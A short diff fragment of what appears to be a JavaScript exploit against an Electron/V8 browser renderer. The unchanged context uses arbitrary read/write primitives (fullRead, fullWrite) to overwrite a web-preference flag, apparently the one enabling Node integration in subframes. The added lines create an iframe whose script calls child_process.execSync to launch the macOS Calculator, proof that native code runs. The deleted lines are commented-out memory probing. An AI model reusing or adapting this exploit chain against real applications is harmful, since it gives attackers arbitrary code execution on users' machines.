@@ -262,37 +262,19 @@ function itof(val){
     var nisf_val = fullRead(nisf);
     console.log("overwrite nisf_val : "+nisf_val.toString(16));
 
-    // var ni = defont + 0x00000000000000e1n;
-    // var ni_val = fullRead(ni);
-    // console.log("ni_addr : "+ni.toString(16));
-    // console.log("ni_val : "+ni_val.toString(16));
-    // var overwrite = ni_val | 0x0000000000000001n
-    // fullWrite(ni,overwrite);
-    // var ni_val = fullRead(ni);
-    // console.log("overwrite ni_val : "+ni_val.toString(16));
-    // var web_pref = addr2 + 0x50008n
-    // var nisf = web_pref + 0x1acn
-    // var nisf_val = fullRead(nisf);
-    // console.log("nisf_val : "+nisf_val);
-    // var nisf_val = nisf_val | 0x0000000000000001n
-    // fullWrite(nisf,nisf_val);
-    // var nisf_val = fullRead(nisf);
-    // console.log("nisf_val : "+nisf_val);
+var aIframe = document.createElement("iframe");
+aIframe.style.width = "200px";
+aIframe.style.height = "100px";
+aIframe.srcdoc = "<script>require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')</script>";
+document.body.appendChild(aIframe);
+
+    
+
     
     
     
-    
-   
-   
-    
-        //console.log(typeof(fakeDblArr));
-        //////// 위까지 fake Array        
-        // var win_arr = addrOf(window);
-        // console.log('window: '+win_arr);
-        // var arr1 = ftoi32(compressedRead(win_arr+0x18))[0];
-        // console.log('arr1: '+arr1);
-        // var arr2 = fullRead(Number(arr1+0xf8n));
-        // console.log('arr2: '+arr2);
+
+
 
 
 
